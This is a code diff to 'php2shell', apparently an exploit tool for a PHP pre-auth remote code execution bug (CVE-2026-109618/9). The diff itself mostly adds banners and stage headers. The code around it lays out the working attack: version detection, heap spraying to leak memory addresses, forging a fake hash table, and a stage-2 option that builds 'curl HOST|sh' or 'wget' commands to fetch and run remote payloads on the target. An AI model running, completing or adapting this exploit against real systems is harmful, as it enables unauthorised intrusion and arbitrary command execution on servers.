@@ -788,8 +788,17 @@ def probe_oom(url, start_mb, zif, dtor, max_mb=200):
         mb = mb * 2 if mb < 64 else mb + 64
     return None
 
+BANNER = (
+    "php2shell  CVE-2026-109618 / CVE-2026-109619\n"
+    "pre-auth RCE via session.upload_progress UAF  (mod_php chain + FPM port)\n"
+    "----------------------------------------------------------------------------"
+)
+
+def _hdr(label):
+    print(f"\n== {label} ==")
+
 def main():
-    ap = argparse.ArgumentParser(description="php2shell — self-contained CVE-2026-109618/9 exploit")
+    ap = argparse.ArgumentParser(description="php2shell: self-contained CVE-2026-109618/9 exploit")
     ap.add_argument("-u", "--url", required=True)
     ap.add_argument("-c", "--cmd", default="id>/tmp/x", help="raw command (<=14 bytes)")
     ap.add_argument("--stage2", metavar="HOST", help="fire 'curl HOST|sh' (<=14B) for arbitrary payload")
@@ -821,6 +830,8 @@ def main():
     ap.add_argument("--fpm-arm-path", default="", help="URL path to the application endpoint that calls session_start() (required for in-band OOM; without this the fallback upload_progress arm kills the worker)")
     a = ap.parse_args()
 
+    print(BANNER)
+
     if a.stage2:
         a.cmd = (f"curl {a.stage2}|sh" if a.fetcher == "curl" else f"wget -qO-{a.stage2}|sh")
         if len(a.cmd) > 14:
@@ -834,6 +845,7 @@ def main():
         print(f"    Use --stage2 <short-domain> to bootstrap longer payloads via `curl HOST|sh`.")
         return 1
 
+    _hdr("detect")
     ver, arch = detect(a.url, a.container)
     if not ver: print("[-] could not detect PHP version"); return 1
     # patched floors (fix landed in these; >= => not vulnerable). cross-ref CVE advisories/neko.
@@ -854,6 +866,7 @@ def main():
 
     # --- Chain-E (FPM) branch — ported from dinosn/php-cve-2026-10961x-lab-poc (MIT)
     if a.fpm:
+        _hdr("chain-e / fpm")
         fam = ce_family(ver)
         if not fam: print(f"[-] no Chain-E family for {ver}"); return 1
         print(f"[*] Chain-E family {fam.get('version')} ({fam['source']}, status={fam.get('status','?')})")
@@ -936,6 +949,7 @@ def main():
     print(f"[*] OOM field = {huge}MB")
 
     if a.probe_only:
+        _hdr("probe")
         print(f"[*] running behavioral vulnerability probe...")
         verdict, reason = probe_vulnerable(a.url, zif, dtor, huge, attempts=3, timeout=30)
         if verdict == "vulnerable":
@@ -949,6 +963,7 @@ def main():
             print(f"[?] UNKNOWN: {reason}")
             return 1
 
+    _hdr("stage 1: chunk-base leak")
     chunk = spray_phase(a.url, "stage1", zif, dtor, 0, huge, a.threads, a.timeout, arm_mode=a.arm)
     if not chunk:
         print("[-] stage1 heap leak failed. Diagnosing one serial attempt...")
@@ -960,6 +975,7 @@ def main():
             print(f"    diag failed: {e}")
         return 1
     print(f"[+] chunk base  = {chunk:#x}")
+    _hdr("stage 2: libphp-base leak")
     libphp = spray_phase(a.url, "stage2", zif, dtor, 0, huge, a.threads, a.timeout, arm_mode=a.arm)
     if not libphp:
         print("[-] stage2 libphp leak failed.")
@@ -978,6 +994,7 @@ def main():
         print(f"[+] derived htdata = {derived:#x}")
         prof["htdata"] = derived
 
+    _hdr("stage 3: fake-HT forge + RCE")
     HT, ZIFA = chunk + prof["htdata"], libphp + zif
     out = a.cmd.split(">")[-1].strip() if ">" in a.cmd else None
     if a.container and out:
@@ -1007,7 +1024,12 @@ def main():
         time.sleep(0.5)
     stop.set()
     if proof:
-        print(f"[+] RCE: {proof}"); return 0
+        bar = "+" + "-" * 72 + "+"
+        print(f"\n{bar}\n| RCE confirmed  ({n[0]} fires in {int(time.time() - (dl - a.timeout))}s window)")
+        for line in proof.splitlines():
+            print(f"| {line}")
+        print(f"{bar}")
+        return 0
     # Diagnose: if nearly every fire raised an exception, something's wrong with the payload
     err_total = sum(errs.values())
     if a.stage2:
